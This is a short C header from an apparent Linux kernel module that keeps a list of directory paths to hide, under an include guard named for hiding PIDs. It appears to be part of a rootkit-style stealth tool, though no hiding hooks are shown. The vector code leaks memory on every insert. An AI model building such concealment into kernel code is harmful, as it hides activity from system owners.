#include "utility.h"

#ifndef HIDE_PIDS_H
#define HIDE_PIDS_H

struct Vector {
	int size;
	void** arr;
};

#define vector struct Vector*

vector vector_init(void) {
	vector v = kmalloc(sizeof(struct Vector), GFP_KERNEL);
	v->size = 0;
	v->arr = 0;
	return v;
}

void vector_insert(vector v, void* entry) {
	int i;
	void** new_arr;
	new_arr = kmalloc(sizeof(void*) * (v->size + 1), GFP_KERNEL);
	if (v->arr) {
		for (i = 0; i < v->size; ++i) {
			new_arr[i] = v->arr[i];
		}
	}
	v->arr = new_arr;
	v->arr[v->size] = entry;
	v->size = v->size + 1;
}

void vector_remove(vector v, int index) {
	v->arr[index] = v->arr[v->size - 1];
	v->size--;
}

void vector_free(vector v) {
	kfree(v->arr);
	kfree(v);
}

extern vector hiddenDirectories;

void hideDirectory(char* path) {
	vector_insert(hiddenDirectories, kstrdup(path, GFP_KERNEL));
	printk(KERN_INFO "%d", hiddenDirectories->size);
}

#endif